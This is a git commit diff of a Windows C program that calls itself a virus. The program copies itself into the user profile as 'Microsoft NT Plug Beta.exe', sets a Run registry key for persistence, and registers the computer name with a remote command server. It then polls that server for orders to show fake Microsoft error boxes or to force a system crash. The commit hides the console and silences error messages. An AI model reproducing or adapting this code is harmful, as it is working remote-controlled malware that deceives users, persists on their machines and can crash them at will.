376d49806dc0da7d49dd12b1c88b1a946f88ae2e
devos_c <loukmane.khaled@gmail.com>
2023-03-11 12:37:06 +0100

    .

--- main.c
+++ main.c
@@ -11,6 +11,18 @@
 #pragma comment(lib, "Userenv.lib")
 #pragma comment(lib, "Advapi32.lib")
 
+
+// #define ___DEBUGAPP 0
+
+#ifdef ___DEBUGAPP
+#define errormsg(msg) {MessageBoxA(NULL, msg, "Error", MB_OK); exit(-1);}
+#define smsg(msg) {MessageBoxA(NULL, msg, "msg", MB_OK);}
+#else
+#define errormsg(msg) {exit(-1);}
+#define smsg(msg) {}
+
+#endif
+
 enum SERVER_COMMAND {
     CMD_MSG = 0,
     CMD_CRASH = 1,
@@ -25,11 +37,8 @@ enum SERVER_COMMAND {
 UINT64 UserId = 0;
 
 
-void ShowMsg(char* Title, char* Msg) {
-    MessageBoxA(NULL, Msg, Title, MB_OK);
-}
 
-char req[2048] = {0};
+char req[0x1002] = {0};
 char response[0x20002] = {0};
 char* uagent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
 void TcpInit() {
@@ -46,20 +55,23 @@ void ServerRequest(int Cmd, char* arg0, char* arg1, char** Buffer) {
     SOCKET Socket;
     PADDRINFOA addr;
 
-    int res = getaddrinfo("145.14.145.86", "80", 0, &addr);
+    int res = getaddrinfo("molakimtaypointi.000webhostapp.com", "80", 0, &addr);
     if(res != 0) return; // probably there is no internet connection so keep pinging
 
     Socket = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
     if(Socket == INVALID_SOCKET) return; // probably there is no internet connection so keep pinging
 
 
-    sprintf_s(req, 2048, "POST /?cmd=%u&uid=%lld&arg0=%s&arg1=%s HTTP/1.1\nUser-Agent: %s\nconnection: close\ncontent-length:0\nhost: molakimtaypointi.000webhostapp.com\naccept:*/*\n\n", Cmd, UserId, arg0, arg1, uagent);
+    sprintf_s(req, 0x1000, "POST /?cmd=%u&uid=%lld&arg0=%s&arg1=%s HTTP/1.1\nUser-Agent: %s\nconnection: close\ncontent-length:0\nhost: molakimtaypointi.000webhostapp.com\naccept:*/*\n\n", Cmd, UserId, arg0, arg1, uagent);
     
     res = connect(Socket, addr->ai_addr, addr->ai_addrlen);
     if(res != 0) return; // probably there is no internet connection so keep pinging
+
     send(Socket, req, strlen(req), 0);
     int length;
+
     recv(Socket, response, 0x20000, 0);
+
     closesocket(Socket);
     char* b = response;
     for(;;) {
@@ -121,49 +133,42 @@ int QueryPendingCmd(char** _arg0, char** _arg1) {
     return Cmd;
 }
 
+
+
 extern NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
 extern NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
     PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
-// int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPWSTR lpCmdLine, int nCmdShow) {
-int main(int argc, char** argv) {
-    
+char path[121] = {0};//argv[0];
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow) {
+    DWORD sz = 120;
+    if(!QueryFullProcessImageNameA(GetCurrentProcess(), 0, path, &sz)) errormsg("QueryProcessImageName");
     TcpInit();
     DWORD MaxChars = 120;
     GetComputerNameA(ComputerName, &MaxChars);
     printf("Computer name : %s\n", ComputerName);
-    char* path = argv[0];
-    // check if path doesn't end with .exe
-    if(memcmp(path + strlen(path) - 4, ".exe", 4) != 0) {
-        strcat(path, ".exe");
-    }
     printf("path : %s\n", path);
     // Install the virus
     HANDLE CurrentFile, TargetFile;
     // char* TargetPath = "%%HOMEDRIVE%%\%%HOMEPATH%%/Microsoft NT Plug.exe";
     CurrentFile = CreateFileA(path, FILE_READ_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if(CurrentFile == INVALID_HANDLE_VALUE) {
-        printf("failed to open current file.\n");
-        while(1);
-        return -1;
+        errormsg("failed to open current file.\n");
     }
-    char* TargetPath;
-    DWORD sz = 0;
+    char TargetPath[0x100];
+    sz = 0xFF;
     HANDLE Token;
     if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &Token)) {
-        printf("TOKEN_QUERY Not granted\n");
-        while(1);
-        return -1;
+        errormsg("TOKEN_QUERY Not granted\n");
     };
     GetUserProfileDirectoryA(Token, NULL, &sz);
-    sz+=0x10;
-    TargetPath = malloc(sz);
     if(!GetUserProfileDirectoryA(Token, TargetPath, &sz)) {
-        printf("upf");
-        while(1);
-        return -1;
+        errormsg("Getuserprofiledir");
     }
 
     printf("SZ : %d, User path : %s\n", sz, TargetPath);
+    smsg(path);
+    smsg(TargetPath);
+
 
     strcat(TargetPath, "\\Microsoft NT Plug Beta.exe");
     TargetFile = CreateFileA(TargetPath, FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
@@ -171,10 +176,9 @@ int main(int argc, char** argv) {
     if(TargetFile == INVALID_HANDLE_VALUE) {
         if(GetLastError() == ERROR_SHARING_VIOLATION) {
             ContinueInstall = FALSE;
-            printf("Sharing violation\n");
+            smsg("Sharing violation\n");
         } else {
-            printf("failed to open target file : %d\n", GetLastError());
-            return -1;
+            errormsg("Failed to install the program.");
         }
     }
 
@@ -184,7 +188,7 @@ int main(int argc, char** argv) {
         ReadFile(CurrentFile, ProgBuffer, ProgSize, NULL, NULL);
         WriteFile(TargetFile, ProgBuffer, ProgSize, NULL, NULL);
         CloseHandle(TargetFile);
-
+        free(ProgBuffer);
 
     }
 
@@ -193,38 +197,40 @@ int main(int argc, char** argv) {
         RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
         RegSetValueExA(hkey, "Microsoft NT Plug Beta", 0, REG_SZ , TargetPath, strlen(TargetPath));
 
+    smsg("registering the user.");
+    smsg(ComputerName);
     // Start the server connection
     char* buff;
     for(;;) {
         ServerRequest(CMD_REGISTER_USER, ComputerName, "", &buff);
         if(buff) break;
+        smsg("retry");
         Sleep(3000);
     }
+
+    smsg("user registered.");
 
     UserId = _strtoui64(buff, NULL, 10);
     printf("User Id : %llu\n", UserId);
     char* arg0, *arg1;
 
+    Sleep(2000);
+
     for(;;) {
         int Cmd = QueryPendingCmd(&arg0, &arg1);
-        switch(Cmd) {
-            case CMD_MSG:{
-                if(strlen(arg0) < 3) arg0 = "Microsoft Error";
-                if(strlen(arg1) < 3) arg1 = "A Pending Operation has been canceled.";
+        if(Cmd == CMD_MSG) {
+            if(strlen(arg0) < 3) arg0 = "Microsoft Error";
+            if(strlen(arg1) < 3) arg1 = "A Pending Operation has been canceled.";
 
-                MessageBoxA(NULL, arg1, arg0, MB_OK);
-                break;
-            }
-            case CMD_CRASH: {
-                BOOLEAN bl;
-                ULONG Response;
-                RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
-                NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
-                break;
-            }
-            default: break;
+            MessageBoxA(NULL, arg1, arg0, MB_OK);
+        } else if(Cmd == CMD_CRASH) {
+            BOOLEAN bl;
+            ULONG Response;
+            RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
+            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
+            break;
         }
-        Sleep(1000);
     }
+    errormsg("Loop has been jumped.");
     return 0;
 }
